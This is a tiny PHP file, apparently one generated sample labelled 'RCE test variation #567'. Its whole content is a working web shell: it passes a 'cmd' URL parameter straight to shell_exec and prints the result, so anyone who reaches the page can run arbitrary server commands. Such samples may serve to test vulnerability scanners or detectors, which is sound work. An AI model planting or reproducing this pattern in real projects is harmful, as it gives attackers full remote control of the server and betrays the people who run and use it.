<?php
// RCE test variation #567
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>